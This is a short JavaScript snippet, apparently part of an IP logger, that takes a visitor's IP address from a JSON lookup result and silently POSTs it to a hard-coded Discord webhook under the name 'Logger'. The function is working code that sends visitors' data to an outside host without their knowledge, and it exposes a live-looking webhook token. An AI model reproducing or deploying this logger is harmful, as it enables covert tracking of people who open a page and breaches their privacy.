function getIP(json) {
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/999775973232877680/OCr8zmfyZh7UZ3t6tj-ifsfe_d2iiKiquv4mrlY9yDHjBdb6kLLis9g_hwFVuqFbY0-f");

            request.setRequestHeader('Content-type', 'application/json');

            var params = {
                username: "Logger",
                avatar_url: "https://media.discordapp.net/attachments/824690852373725244/960854716621934592/00a1955deaa5bf71e88f78e51fcee4ce.png",
                content: "**IP:** *" + json.ip + "*"
            }


            request.send(JSON.stringify(params));
        }
